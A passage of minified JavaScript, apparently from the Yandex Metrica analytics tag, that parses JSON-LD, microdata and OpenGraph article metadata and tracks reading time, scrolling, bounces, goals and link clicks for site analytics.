                            ? (r.push(n), i.push(n.id))
                            : n && n.chars <= Vl[n.type] && t.ph(n.id, n),
                          { values: r, Ef: i }
                        );
                      },
                      { values: [], Ef: Vu(Au("id"), e) },
                      i
                    ).values),
                    e.concat(
                      Vu(function (t) {
                        var e;
                        return (
                          (t = Nu(
                            (((e = { index: n, Ae: !1 }).involvedTime = 0), e),
                            t
                          )),
                          (n += 1),
                          t
                        );
                      }, i)
                    )
                  );
                },
                [],
                e
              );
            }),
            t
          );
        })(),
        Yl = (function (t) {
          function e() {
            var e,
              n = (null !== t && t.apply(this, arguments)) || this;
            return (
              (n.id = "j"),
              (n.Pd = !0),
              (n.df = iu(",", [
                'script[type="application/ld+json"]',
                'script[type="application/json+ld"]',
                'script[type="ld+json"]',
                'script[type="json+ld"]',
              ])),
              (n.Bb =
                (((e = {}).id = function (t) {
                  var e = t.data["@id"];
                  return (
                    (t = t.data.mainEntity || t.data.mainEntityOfPage),
                    !e && t && (e = t["@id"]),
                    e
                  );
                }),
                (e.chars = function (t) {
                  return "string" == typeof t.data.text
                    ? t.data.text.length
                    : this.Ba(t).innerText.length;
                }),
                (e.authors = function (t) {
                  var e = [];
                  return (e = (e = e.concat(this.oc(t.data, "author"))).concat(
                    this.oc(t.data.mainEntity, "author")
                  )).concat(this.oc(t.data.mainEntityOfPage, "author"));
                }),
                (e.pageTitle = function (t) {
                  var e = t.data.headline || "";
                  return (
                    t.data.fk && (e += " " + t.data.alternativeHeadline),
                    "" === e &&
                      (t.data.name
                        ? (e = t.data.name)
                        : t.data.itemReviewed && (e = t.data.itemReviewed)),
                    3 === t.type &&
                      t.data.parentItem &&
                      (e = t.data.parentItem.text),
                    e
                  );
                }),
                (e.updateDate = function (t) {
                  return t.data.dateModified || "";
                }),
                (e.publicationDate = function (t) {
                  return t.data.datePublished || "";
                }),
                (e.pageUrlCanonical = function (t) {
                  return t.data.url;
                }),
                (e.topics = function (t) {
                  return this.oc(t.data, "about", ["name", "alternateName"]);
                }),
                (e.rubric = function (t) {
                  var e = this,
                    n = this.Ba(t);
                  return (t = Lu(
                    Boolean,
                    Vu(function (t) {
                      if ((t = ua(e.b, t.innerText))) {
                        var n = e.wf(t);
                        if (n)
                          return Cu(
                            function (t, e) {
                              return (
                                t || ("BreadcrumbList" === e["@type"] ? e : t)
                              );
                            },
                            null,
                            n
                          );
                        if ("BreadcrumbList" === t["@type"]) return t;
                      }
                      return null;
                    }, [t.element].concat(
                      ci(
                        this.df,
                        document.body === n ? document.documentElement : n
                      )
                    ))
                  )).length && lo((t = t[0].itemListElement))
                    ? Lu(
                        Boolean,
                        Vu(function (t) {
                          return t.item && !e.b.isNaN(t.position)
                            ? {
                                name: t.item.name || t.name,
                                position: t.position,
                              }
                            : null;
                        }, t)
                      )
                    : [];
                }),
                e)),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.oc = function (t, e, n) {
              return (
                void 0 === n && (n = ["name"]),
                t && t[e]
                  ? ((t = lo(t[e]) ? t[e] : [t[e]]),
                    (t = Lu(
                      Boolean,
                      Vu(function (t) {
                        return t
                          ? "string" == typeof t
                            ? t
                            : Cu(
                                function (e, n) {
                                  return e || t[n];
                                },
                                "",
                                n
                              )
                          : null;
                      }, t)
                    )),
                    Vu(function (t) {
                      var e;
                      return ((e = {}).name = t), e;
                    }, t))
                  : []
              );
            }),
            (e.prototype.Ba = function (t) {
              var e = t.element,
                n = t.data["@id"],
                r = t.data.url;
              return (
                (t = null),
                r && "string" == typeof r && (t = this.nf(r)),
                !t && n && "string" == typeof n && (t = this.nf(n)),
                t ||
                  ((t = n = e.parentNode),
                  !mi("head", this.b, e) && n && 0 !== n.innerText.length) ||
                  (t = this.b.document.body),
                t
              );
            }),
            (e.prototype.nf = function (t) {
              try {
                var e = fa(this.b, t).hash;
                if (e) {
                  var n = ui(e, this.b.document.body);
                  if (n) return n;
                }
              } catch (t) {}
              return null;
            }),
            (e.prototype.ke = function (t) {
              return this.Ne[t["@type"]] || 1;
            }),
            (e.prototype.va = function (e) {
              var n = this,
                r = e.element;
              if (
                !e.data &&
                ((e.data = ua(this.b, r.innerText)),
                !e.data ||
                  (!/schema\.org/.test(e.data["@context"]) && !lo(e.data)))
              )
                return null;
              var i = this.wf(e.data);
              if (i)
                return Vu(function (e) {
                  return Fu(e["@type"], n.pb["schema.org"])
                    ? ((e = { element: r, data: e, type: n.ke(e) }),
                      t.prototype.va.call(n, e))
                    : null;
                }, i);
              if ("QAPage" === e.data["@type"]) {
                var o = e.data.mainEntity || e.data.mainEntityOfPage;
                if (!o) return null;
              }
              return (
                "Question" === e.data["@type"] && (o = e.data),
                o
                  ? ((e = Yu(wo(o, mo), ["acceptedAnswer", "suggestedAnswer"])),
                    Vu(function (e) {
                      var i;
                      return e && Fu(e["@type"], n.pb["schema.org"])
                        ? ((e = {
                            element: r,
                            type: n.ke(e),
                            data: Nu(((i = {}), (i.parentItem = o), i), e),
                          }),
                          t.prototype.va.call(n, e))
                        : null;
                    }, e))
                  : Fu(e.data["@type"], this.pb["schema.org"])
                  ? t.prototype.va.call(this, Nu(e, { type: this.ke(e.data) }))
                  : null
              );
            }),
            (e.prototype.pc = function () {
              return ci(this.df, this.root);
            }),
            (e.prototype.wf = function (t) {
              return (lo(t) && t) || (t && lo(t["@graph"]) && t["@graph"]);
            }),
            e
          );
        })(zl),
        ql = (function (t) {
          function e() {
            var e,
              n = (null !== t && t.apply(this, arguments)) || this;
            return (
              (n.id = "s"),
              (n.Pd = !0),
              (n.Kj = yo(
                "exec",
                new RegExp("schema.org\\/(" + iu("|", Mu(n.Ne)) + ")$")
              )),
              (n.Bb =
                (((e = {}).id = function (t) {
                  t = t.element;
                  var e = ya(this.b, t, "identifier");
                  return e
                    ? wa(e)
                    : (e = ya(this.b, t, "mainEntityOfPage")) &&
                      e.getAttribute("itemid")
                    ? e.getAttribute("itemid")
                    : null;
                }),
                (e.chars = function (t) {
                  var e = 0;
                  t = t.element;
                  for (
                    var n = [
                        "articleBody",
                        "reviewBody",
                        "recipeInstructions",
                        "description",
                        "text",
                      ],
                      r = 0;
                    r < n.length;
                    r += 1
                  ) {
                    var i = ya(this.b, t, n[r]);
                    if (i) {
                      e = wa(i).length;
                      break;
                    }
                  }
                  return 0 === e && t.innerText && (e += t.innerText.length), e;
                }),
                (e.topics = function (t) {
                  var e = this,
                    n = ba(this.b, t.element, "about");
                  return Vu(function (t) {
                    var r = { name: wa(t) };
                    return (n = ya(e.b, t, "name")) && (r.name = wa(n)), r;
                  }, n);
                }),
                (e.rubric = function (t) {
                  var e = this;
                  return (
                    (t = ui(
                      '[itemtype$="schema.org/BreadcrumbList"]',
                      t.element
                    )) ||
                      (t = ui(
                        '[itemtype$="schema.org/BreadcrumbList"]',
                        this.root
                      )),
                    t
                      ? Vu(function (t) {
                          return {
                            name: wa(ya(e.b, t, "name")),
                            position: wa(ya(e.b, t, "position")),
                          };
                        }, ba(this.b, t, "itemListElement"))
                      : []
                  );
                }),
                (e.updateDate = function (t) {
                  return (t = ya(this.b, t.element, "dateModified"))
                    ? Ea(t)
                    : "";
                }),
                (e.publicationDate = function (t) {
                  return (t = ya(this.b, t.element, "datePublished"))
                    ? Ea(t)
                    : "";
                }),
                (e.pageUrlCanonical = function (t) {
                  if ((t = ba(this.b, t.element, "url")).length) {
                    var e = t[0];
                    return e.href ? e.href : wa(t);
                  }
                  return null;
                }),
                (e.pageTitle = function (t) {
                  var e = "",
                    n = t.element,
                    r = ya(this.b, n, "headline");
                  return (
                    r && (e += wa(r)),
                    (r = ya(this.b, n, "alternativeHeadline")) &&
                      (e += " " + wa(r)),
                    "" === e &&
                      ((r = ya(this.b, n, "name")) ||
                        (r = ya(this.b, n, "itemReviewed")),
                      r && (e += wa(r))),
                    3 === t.type &&
                      (t = mi(
                        '[itemtype$="schema.org/Question"]',
                        this.b,
                        n
                      )) &&
                      (t = ya(this.b, t, "text")) &&
                      (e += wa(t)),
                    e
                  );
                }),
                (e.authors = function (t) {
                  var e = this;
                  return (
                    (t = ba(this.b, t.element, "author")),
                    Vu(function (t) {
                      var n,
                        r = (((n = {}).name = ""), n);
                      return (
                        /.+schema.org\/(Person|Organization)/.test(
                          t.getAttribute("itemtype") || ""
                        ) &&
                          (n = ya(e.b, t, "name")) &&
                          (r.name = wa(n)),
                        r.name ||
                          (r.name =
                            t.getAttribute("content") ||
                            t.innerText ||
                            t.getAttribute("href")),
                        r
                      );
                    }, t)
                  );
                }),
                e)),
              n
            );
          }
          return (
            Jo(e, t),
            (e.prototype.Af = function (t) {
              return (
                (t = t.getAttribute("itemtype") || ""),
                (t = this.Kj(t)) ? this.Ne[t[1]] : 1
              );
            }),
            (e.prototype.va = function (e) {
              return e.element &&
                e.element.innerText &&
                e.element.innerText.length
                ? t.prototype.va.call(this, e)
                : null;
            }),
            (e.prototype.pc = function () {
              return ci(
                iu(
                  ",",
                  Vu(function (t) {
                    return '[itemtype$="schema.org/' + t + '"]';
                  }, this.pb["schema.org"])
                ),
                this.root
              );
            }),
            e
          );
        })(zl),
        Kl = (function (t) {
          function e(e, n) {
            var r,
              i = t.call(this, e, n) || this;
            return (
              (i.id = "o"),
              (i.Bb =
                (((r = {}).chars = function (t) {
                  return (t = this.Ba(t)).innerText ? t.innerText.length : 0;
                }),
                (r.authors = function (t) {
                  return this.Ed(t.data.author);
                }),
                (r.pageTitle = function (t) {
                  return this.vc(t.data.title) || "";
                }),
                (r.updateDate = function (t) {
                  return this.vc(t.data.modified_time);
                }),
                (r.publicationDate = function (t) {
                  return this.vc(t.data.published_time);
                }),
                (r.pageUrlCanonical = function (t) {
                  return this.vc(t.data.url);
                }),
                (r.rubric = function (t) {
                  return this.Ed(t.data.section);
                }),
                (r.topics = function (t) {
                  return this.Ed(t.data.tag);
                }),
                r)),
              (i.yh = new RegExp("^(og:)?((" + iu("|", i.pb.Uf) + "):)?")),
              i
            );
          }
          return (
            Jo(e, t),
            (e.prototype.Ed = function (t) {
              var e;
              return t
                ? lo(t)
                  ? Vu(function (t) {
                      var e;
                      return ((e = {}).name = t), e;
                    }, t)
                  : [((e = {}), (e.name = t), e)]
                : [];
            }),
            (e.prototype.vc = function (t) {
              return lo(t) ? (t.length ? t[0] : null) : t;
            }),
            (e.prototype.pc = function () {
              var t = ci('meta[property="og:type"]', this.b.document.body);
              return [this.b.document.head].concat(t);
            }),
            (e.prototype.Uh = function (t) {
              var e = this,
                n = t.element,
                r = {},
                i = this.Ba(t);
              return (n = ci(
                "meta[property]",
                n === this.b.document.head ? n : i
              )).length
                ? (zu(function (t) {
                    try {
                      if (
                        t.parentNode === i ||
                        t.parentNode === e.b.document.head
                      ) {
                        var n = t.getAttribute("property").replace(e.yh, ""),
                          o = wa(t);
                        r[n]
                          ? lo(r[n])
                            ? r[n].push(o)
                            : (r[n] = [r[n], o])
                          : (r[n] = o);
                      }
                    } catch (t) {
                      Yr(e.b, "og.ed", t);
                    }
                  }, n),
                  Fu(r.type, this.pb.Uf) ? Nu(t, { data: r }) : null)
                : null;
            }),
            (e.prototype.Ba = function (t) {
              t = t.element;
              var e = this.b.document;
              return t === e.head ? e.body : t.parentNode;
            }),
            (e.prototype.va = function (e) {
              return (e = this.Uh(e)) ? t.prototype.va.call(this, e) : null;
            }),
            e
          );
        })(zl),
        Wl =
          "resize scroll mousemove mousedown click windowfocus keydown orientationchange change focus touchmove touchstart".split(
            " "
          ),
        Jl = (function () {
          function t(t, e, n, r) {
            (this.Dc = !1),
              (this.Y = {}),
              (this.scroll = { x: 0, y: 0 }),
              (this.fb = this.Of = 0),
              (this.Zd = this.Xf = ""),
              (this.ea = []),
              (this.Ga = 0),
              (this.sb = { Ma: 0, Qe: 0 }),
              (this.buffer = n),
              (this.Vb = yu(this.Vb, this)),
              (this.rc = yu(this.rc, this)),
              (this.Kc = yu(this.Kc, this)),
              (this.b = t),
              (this.Va = r),
              (this.Wc = e),
              (this.Ud = "pai" + e.id),
              this.Cb(),
              (this.kf = os(this.b)),
              (this.time = mf(this.b)),
              this.Eg(),
              (this.wc = Pu(this.b));
          }
          return (
            (t.prototype.start = function () {
              var t = this;
              if (!this.Dc) {
                this.buffer.C("ag", this.rc),
                  this.buffer.C("se", this.Kc),
                  this.wj();
                var e = this.wc.l(this.Ud, []),
                  n = !e.length;
                e.push(yu(this.Di, this)),
                  this.wc.Fa(this.Ud, e),
                  n && this.fg(),
                  this.wc.Fa("pai", function () {
                    return t.ea.length
                      ? Cu(
                          function (t, e) {
                            return (t.Xc || 0) <= (e.Xc || 0) ? e : t;
                          },
                          t.ea[0],
                          t.ea.slice(1)
                        ).id
                      : 0;
                  }),
                  this.Vb({ type: "page", target: this.b });
              }
            }),
            (t.prototype.stop = function () {
              this.buffer.da("se", this.Kc),
                this.buffer.da("ag", this.rc),
                this.Lj(),
                (this.Dc = !0);
            }),
            (t.prototype.Mf = function (t) {
              return mi("html", this.b, t) !== this.b.document.documentElement;
            }),
            (t.prototype.fg = function () {
              var t = this;
              Ur(this.b, "p.ic" + this.Wc.id, function () {
                if (!t.Dc) {
                  var e = t.wc.l(t.Ud),
                    n = t.Wc.Hh();
                  zu(function (t) {
                    var e = Vu(function (t) {
                      return Nu({}, t);
                    }, n);
                    ko(t) && t(e);
                  }, e),
                    (t.Ga = Br(t.b, yu(t.fg, t), 1e3, "p"));
                }
              })();
            }),
            (t.prototype.Di = function (t) {
              this.Dc || (this.Mj(t), this.Oj(), this.rj());
            }),
            (t.prototype.Vb = function (t) {
              var e = this;
              Ur(this.b, "p.ec." + this.Wc.id, function () {
                try {
                  var n = t.type,
                    r = t.target;
                } catch (t) {
                  return;
                }
                var i = "page" === n;
                if ("scroll" === n || i) {
                  var o = [
                    e.b,
                    e.b.document,
                    e.b.document.documentElement,
                    ki(e.b),
                  ];
                  Fu(r, o) && e.Cb();
                }
                ("resize" === n || i) && e.Eg(), (n = e.time(gr));
                var a = Math.min(n - e.Of, 5e3);
                if (
                  ((e.fb += Math.round(a)), (e.Of = n), e.Y && e.scroll && e.sb)
                ) {
                  var u = e.sb.Ma * e.sb.Qe;
                  e.ea = Vu(function (t) {
                    var n = Nu({}, t),
                      r = e.Y[n.id],
                      i = Ei(t.zb);
                    if (!r || e.Mf(n.element) || !i) return n;
                    r = (t = e.b.Math).max(
                      (e.scroll.y + e.sb.Ma - r.y) / r.height,
                      0
                    );
                    var o = i.height * i.width;
                    return (
                      (i = e.gh(i)),
                      (n.Xc = i / u),
                      (n.visibility = i / o),
                      (0.9 <= n.visibility || 0.1 <= n.Xc) &&
                        (n.involvedTime += a),
                      (n.maxScrolled = t.round(1e4 * r) / 1e4),
                      n
                    );
                  }, e.ea);
                }
              })();
            }),
            (t.prototype.gh = function (t) {
              var e = t.top,
                n = t.bottom,
                r = t.left,
                i = this.sb,
                o = i.Qe;
              i = i.Ma;
              var a = this.b.Math;
              return (
                (t = a.min(a.max(t.right, 0), o) - a.min(a.max(r, 0), o)),
                (a.min(a.max(n, 0), i) - a.min(a.max(e, 0), i)) * t
              );
            }),
            (t.prototype.Mj = function (t) {
              var e = Vu(function (t) {
                return t.id;
              }, this.ea);
              this.ea = this.ea.concat(
                Lu(function (t) {
                  return !Fu(t.id, e);
                }, t)
              );
            }),
            (t.prototype.Eg = function () {
              var t = Ai(this.b) || Ci(this.b);
              this.sb = { Qe: t[0], Ma: t[1] };
            }),
            (t.prototype.Oj = function () {
              var t = this;
              Ur(this.b, "p.um." + this.Wc.id, function () {
                var e = [];
                t.Cb(),
                  (t.Y = Cu(
                    function (n, r) {
                      var i;
                      if (t.Mf(r.element)) e.push(r), delete n[r.id];
                      else {
                        var o =
                          (((i = {}).id = r.id),
                          (i.involvedTime = Math.max(r.involvedTime, 0)),
                          (i.maxScrolled = r.maxScrolled || 0),
                          (i.chars = (r.update && r.update("chars")) || 0),
                          i);
                        r.zb &&
                          (i = Ei(r.zb)) &&
                          ((o.x = Math.max(Math.round(i.left) + t.scroll.x, 0)),
                          (o.y = Math.max(Math.round(i.top) + t.scroll.y, 0)),
                          (o.width = Math.round(i.width)),
                          (o.height = Math.round(i.height))),
                          (n[r.id] = o);
                      }
                      return n;
                    },
                    {},
                    t.ea
                  )),
                  zu(function (e) {
                    (e = Ju(t.b)(e, t.ea)), t.ea.splice(e, 1);
                  }, e);
              })();
            }),
            (t.prototype.Kc = function () {
              this.Xf = this.Zd;
            }),
            (t.prototype.rc = function () {
              var t,
                e,
                n = Vu(wo(this.Y, mo), Mu(this.Y));
              return n.length &&
                ((this.Zd = Oi(this.b, n)), this.Xf !== this.Zd)
                ? (((t = {}).type = "publishersHeader"),
                  (t.data =
                    (((e = {}).articleMeta = n || []),
                    (e.involvedTime = this.fb),
                    e)),
                  t)
                : null;
            }),
            (t.prototype.rj = function () {
              var t = this;
              if (this.ea.length) {
                var e = Lu(function (t) {
                  return !t.Ae;
                }, this.ea);
                zu(function (e) {
                  var n,
                    r = Nu({}, e);
                  delete r.zb,
                    delete r.Ae,
                    delete r.index,
                    delete r.involvedTime,
                    delete r.visibility,
                    delete r.Xc,
                    delete r.maxScrolled,
                    delete r.update,
                    delete r.element,
                    delete r.type,
                    t.buffer.push(
                      (((n = {}).type = "articleInfo"),
                      (n.stamp = r.stamp),
                      (n.data = r),
                      n)
                    ),
                    (e.Ae = !0);
                }, e),
                  e.length &&
                    an(this.b, this.Va, "Publisher content info found: ", e);
              }
            }),
            (t.prototype.wj = function () {
              this.kf.C(this.b, Wl, this.Vb);
            }),
            (t.prototype.Lj = function () {
              this.kf.Tb(this.b, Wl, this.Vb);
            }),
            (t.prototype.Cb = function () {
              this.scroll = {
                x:
                  this.b.pageXOffset ||
                  mo(this.b, "document.documentElement.scrollLeft") ||
                  0,
                y:
                  this.b.pageYOffset ||
                  mo(this.b, "document.documentElement.scrollLeft") ||
                  0,
              };
            }),
            t
          );
        })(),
        $l = {};
      Yl && ($l.json_ld = Yl),
        ql && (($l.schema = ql), ($l.microdata = ql)),
        Kl && ($l.opengraph = Kl);
      var Zl,
        Ql,
        td,
        ed,
        nd = Hr("p.p", function (t, e) {
          function n(n, r, o) {
            return i(Nu({}, c, { $: n, bf: Xt(r) }), e, o).catch(
              Ur(t, "s.ww.p")
            );
          }
          if (!zo("querySelectorAll", t.document.querySelectorAll))
            return us.resolve();
          var r = [new Ll(t)];
          r.unshift(new Hl(t));
          var i = Sl(t, "p", e),
            o = Bu(function (t) {
              return t.isEnabled();
            }, r);
          r = Uc();
          var a = vf(t, e.id),
            u = a.l("pai");
          u && (a.ic("pai"), r.o("pai", u));
          var c = { F: {}, H: r, If: !(o instanceof Ll) };
          return xn(
            t,
            e,
            Ur(t, "ps.s", function (r) {
              if ((r = mo(r, "settings.publisher.schema"))) {
                r = zi(e) ? "microdata" : r;
                var i = $l[r];
                if (i && o) {
                  var a = Fc(e),
                    u = Xl.Fd(a, "e", n, o, t);
                  (i = new i(t, a)),
                    new Jl(t, i, u, a).start(),
                    an(t, a, 'Publishers analytics schema "' + r + '"');
                }
              }
            })
          );
        }),
        rd = Xo(function (t, e) {
          return (function (t, e) {
            var n = {};
            return (
              Ut(t)(function (t) {
                n = t[e] || {};
              }),
              n
            );
          })(t, e);
        }),
        id = Hr("c.c.cc", function (t) {
          var e = Pu(t),
            n = po(rd(t), function (e) {
              var n;
              return Nu(
                {},
                e,
                (((n = {}).oldCode = !!t.ya_cid),
                (n.clickmap = !!e.clickmap),
                n)
              );
            });
          return Ur(t, "g.c.cc", po(yu(e.l, e, "counters", {}), Mu, qu(n)));
        }),
        od = Hr("gt.c.rs", function (t, e) {
          var n,
            r = Fc(e),
            i = e.id,
            o = e.aa,
            a = e.oh,
            u = e.Ta,
            c = e.Le,
            s = Eo([t, r], Gt);
          return (
            Ht(
              t,
              r,
              (((n = {}).id = i),
              (n.type = +o),
              (n.clickmap = a),
              (n.webvisor = !!u),
              (n.trackHash = !!c),
              n)
            ),
            s
          );
        }),
        ad = Hr("th.e", function (t, e) {
          function n() {
            o ||
              (u = ho(t, "onhashchange")
                ? os(t).C(t, ["hashchange"], a)
                : Ca(t, a));
          }
          var r = Sl(t, "t", e),
            i = Ft(t, Fc(e)),
            o = !1,
            a = Ur(t, "h.h.ch", yu(Aa, null, t, e, r)),
            u = qo;
          return (
            e.Le && (n(), (o = !0)),
            {
              Gj: Ur(t, "tr.hs.h", function (t) {
                var e;
                t ? n() : u(), i((((e = {}).trackHash = o = !!t), e));
              }),
              unsubscribe: u,
            }
          );
        }),
        ud = {
          1882689622: 1,
          2318205080: 1,
          3115871109: 1,
          3604875100: 1,
          339366994: 1,
          2890452365: 1,
          849340123: 1,
          173872646: 1,
          2343947156: 1,
          655012937: 1,
          3724710748: 1,
          3364370932: 1,
          1996539654: 1,
          2065498185: 1,
          823651274: 1,
          12282461: 1,
          1555719328: 1,
          1417229093: 1,
          138396985: 1,
        },
        cd = Io(function () {
          return Cu(
            function (t, e) {
              var n = Zo(e + "/tag.js");
              return ud[n] || (t[n] = 1), t;
            },
            {},
            [
              "mc.yandex.ru",
              "mc.yandex.com",
              "cdn.jsdelivr.net/npm/yandex-metrica-watch",
            ]
          );
        }),
        sd = 1,
        fd = {},
        hd = {},
        ld = Hr("nb.p", function (t, e) {
          function n(e) {
            s() ||
              ((e = "number" == typeof e ? e : 15e3),
              (e = (function (t, e, n) {
                function r() {
                  (fd[p] = !0), o(!1), e();
                }
                function i() {
                  if ((ro(t, hd[p]), fd[p])) o(!1);
                  else {
                    var e = Math.max(0, n - (f ? h : h + u(gr) - l));
                    e ? (hd[p] = Br(t, r, e, "u.t.d.c")) : r();
                  }
                }
                function o(t) {
                  zu(function (e) {
                    var n = e[0],
                      r = e[1];
                    (e = e[2]), t ? d.C(n, r, e) : d.Tb(n, r, e);
                  }, v);
                }
                var a = wo(!1, o);
                if (bc(t)) return { id: Br(t, e, n, "u.t.d"), ff: a };
                var u = mf(t),
                  c = !1,
                  s = !1,
                  f = !0,
                  h = 0,
                  l = u(gr),
                  d = os(t),
                  p = sd;
                (sd += 1), (hd[p] = 0);
                var v = [
                  [
                    t,
                    ["blur"],
                    function () {
                      (f = c = s = !0), (h += u(gr) - l), (l = u(gr)), i();
                    },
                  ],
                  [
                    t,
                    ["focus"],
                    function () {
                      c || s || (h = 0),
                        (l = u(gr)),
                        (c = s = !0),
                        (f = !1),
                        i();
                    },
                  ],
                  [
                    t.document,
                    ["click", "mousemove", "keydown", "scroll"],
                    function () {
                      s || ((c = !0), (f = !1), (s = !0), i());
                    },
                  ],
                ];
                return o(!0), i(), { id: p, ff: a };
              })(t, r(!1), e)),
              (p = e.id),
              (o = e.ff),
              f());
          }
          function r(n) {
            return function (r) {
              var i, o, u;
              if (
                (void 0 === r &&
                  (((i = {}).ctx = {}), (i.callback = qo), (r = i)),
                n || (!d && !c.Qd))
              ) {
                (d = !0),
                  f(),
                  p &&
                    (function (t, e) {
                      bc(t) ? ro(t, e) : ((fd[e] = !0), ro(t, hd[e] || 0));
                    })(t, p);
                var s = h(gr);
                i = (ec(c.l("lastHit")) || 0) < s - 18e5;
                var l = 0.1 > Math.random();
                if (
                  (c.o("lastHit", s),
                  (s = Uc((((o = {}).nb = "1"), (o.cl = v), (o.ar = "1"), o))),
                  (o = Dl(e)),
                  (o = {
                    F: ((u = {}), (u["page-url"] = o.url || Xi(t).href), u),
                    H: s,
                  }),
                  (u = uh(t, Fc(e)).warn),
                  !r.callback && r.ctx && u('"callback" argument missing'),
                  n ||
                    i ||
                    l ||
                    !(function (t, e) {
                      return t && e ? zn(t) === zn(e) : !t && !e;
                    })(t.location.href, t.document.referrer))
                )
                  return (
                    (u = a(o, e).then(function () {
                      if (!n) {
                        var r,
                          i,
                          o,
                          a,
                          u,
                          c = 0.002,
                          s = e.id === Pc.Rg ? 1 : 0.002;
                        void 0 === c && (c = 1), void 0 === s && (s = 1);
                        var f = t.performance;
                        if (
                          f &&
                          ko(f.getEntriesByType) &&
                          ((c = Math.random() > c),
                          (s = Math.random() > s),
                          !c || !s)
                        ) {
                          f = t.performance.getEntriesByType("resource");
                          for (
                            var h = {}, l = {}, d = {}, p = cd(t), v = 0;
                            v < f.length;
                            v += 1
                          ) {
                            var m = f[v],
                              g = m.name
                                .replace(/^https?:\/\//, "")
                                .split("?")[0],
                              b = Zo(g),
                              y =
                                (((r = {}).dns = Math.round(
                                  m.domainLookupEnd - m.domainLookupStart
                                )),
                                (r.tcp = Math.round(
                                  m.connectEnd - m.connectStart
                                )),
                                (r.duration = Math.round(m.duration)),
                                (r.response = Math.round(
                                  m.responseEnd - m.requestStart
                                )),
                                r);
                            "script" !== m.initiatorType ||
                              c ||
                              (l[g] = Nu(
                                y,
                                (((i = {}).name = m.name),
                                (i.decodedBodySize = m.decodedBodySize),
                                i)
                              )),
                              (!ud[b] && !p[b]) ||
                                h[g] ||
                                s ||
                                (h[g] = Nu(
                                  y,
                                  (((o = {}).pages = t.location.href), o)
                                ));
                          }
                          Mu(h).length && (d.timings8 = h),
                            Mu(l).length && (d.scripts = l),
                            Mu(d).length &&
                              Sl(
                                t,
                                "d",
                                e
                              )(
                                {
                                  H: Uc(
                                    ((a = {}), (a.ar = "1"), (a.pv = "1"), a)
                                  ),
                                  $: Oi(t, d) || void 0,
                                  F:
                                    ((u = {}),
                                    (u["page-url"] =
                                      t.location && "" + t.location.href),
                                    u),
                                },
                                { id: Pc.Tg, aa: "0" }
                              ).catch(Ur(t, "r.tim.ng2"));
                        }
                      }
                    })),
                    rn(t, "l.o.l", u, r.callback, r.ctx)
                  );
              }
              return null;
            };
          }
          var i,
            o,
            a = Sl(t, "n", e),
            u = Fc(e),
            c = vf(t, e.id),
            s = wo(wo(u, rd(t)), po(Wo, Au("accurateTrackBounce"))),
            f = wo((((i = {}).accurateTrackBounce = !0), i), Ft(t, u)),
            h = mf(t),
            l = h(gr),
            d = !1,
            p = 0,
            v = 0;
          return (
            xn(t, e, function (t) {
              v = t.Ih - l;
            }),
            e.Wb && n(e.Wb),
            { Pi: r(!0), Wb: n, yd: o }
          );
        }),
        dd = [
          "yandex_metrika_callback" + eu.callbackPostfix,
          "yandex_metrika_callbacks" + eu.callbackPostfix,
        ],
        pd = Hr("cb.i", function (t) {
          var e = dd[0],
            n = dd[1];
          ko(t[e]) && t[e](),
            "object" == typeof t[n] &&
              zu(function (e, r) {
                (t[n][r] = null), to(t, e);
              }, t[n]),
            zu(function (e) {
              try {
                delete t[e];
              } catch (n) {
                t[e] = void 0;
              }
            }, dd);
        }),
        vd = { vk: bo(/[/&=?#]/) },
        md = Hr("go.in", function (t, e, n, r) {
          return (
            void 0 === n && (n = "goal"),
            function (i, o, a, u) {
              var c, s;
              if (!i || (vd[n] && vd[n](i))) return null;
              var f = o,
                h = a || qo;
              ko(o) && ((h = o), (f = void 0), (u = a));
              var l = on(
                  t,
                  e,
                  "Reach goal. Counter: " + e.id + ". Goal id: " + i,
                  f
                ),
                d = "goal" === n;
              return (
                (o = Sl(t, "g", e)),
                (a = (function (t, e, n, r) {
                  var i = Xi(t),
                    o = i.hostname;
                  return (
                    (i = i.href),
                    (e = Dl(e).url) &&
                      ((o = (t = fa(t, e)).hostname), (i = t.href)),
                    [r + "://" + o + "/" + n, i || ""]
                  );
                })(t, e, i, n)),
                (i = a[0]),
                (a = a[1]),
                (f = o(
                  {
                    N: f,
                    H: Uc(((c = {}), (c.ar = 1), c)),
                    F: ((s = {}), (s["page-url"] = i), (s["page-ref"] = a), s),
                  },
                  e
                ).then(function () {
                  d && l(), r && r();
                })),
                rn(t, "g.s", f, h, u)
              );
            }
          );
        }),
        gd = Xo(function (t, e) {
          No(e) ? t.push(e) : zu(po(Ho, yo("push", t)), e);
        }),
        bd = Hr("cl.p", function (t, e) {
          function n(n, i, a, u) {
            void 0 === u && (u = {}),
              a
                ? jt(t, e, {
                    url: a,
                    Fb: !0,
                    Cc: n,
                    Hc: i,
                    sender: r,
                    b: u.ctx,
                    Ua: u.callback,
                    title: u.title,
                    N: u.params,
                  })
                : o.warn("Empty link");
          }
          var r = Sl(t, "2", e),
            i = [],
            o = uh(t, Fc(e)),
            a = Fc(e),
            u = Ur(t, "s.s.tr", wo(Ft(t, a), Bt));
          return (
            (a = {
              b: t,
              Wa: e,
              Gh: i,
              sender: r,
              globalStorage: Pu(t),
              rh: vf(t, e.id),
              si: Fn(t),
              Hj: wo(wo(a, rd(t)), po(Wo, Au("trackLinks"))),
            }),
            (a = Ur(t, "cl.p.c", wo(a, Lt))),
            (a = os(t).C(t, ["click"], a)),
            e.ed && u(e.ed),
            {
              file: Ur(t, "file.clc", Eo([!0, !1], n)),
              Ch: Ur(t, "e.l.l.clc", Eo([!1, !0], n)),
              Xg: (i = Ur(t, "add.f.e.clc", gd(i))),
              ed: u,
              yd: a,
            }
          );
        }),
        yd = [
          [
            ["'(-$&$&$'", 30102, 0],
            ["'(-$&$&$'", 29009, 0],
          ],
          [
            ["oWdZ[nc[jh_YW$Yec", 30103, 1],
            ["oWdZ[nc[jh_YW$Yec", 29010, 1],
          ],
        ],
        wd = [
          [["oWdZ[nc[jh_YW$Yec", 30103, 1]],
          [["oWdZ[nc[jh_YW$Yec", 29010, 1]],
        ],
        Ed = { F: { t: 'UV|L7,!"T[rwe&D_>ZIb\\aW#98Y.PC6k' } },
        xd = { id: 42822899, aa: "0" },
        Cd = (((Ql = {}).s = "p"), (Ql[8] = "i"), Ql),
        Ad = uo("csp", function (t, e) {
          return Sl(t, "s", e)({}, ["https://ymetrica1.com/watch/3/1"]);
        }),
        _d = po(Au("settings.pcs"), ou("1")),
        kd = Hr("s", function (t, e) {
          return xn(t, e, function (n) {
            var r = Pu(t);
            if ((Fc(e), !r.l("dSync", !1)))
              return (
                r.o("dSync", !0),
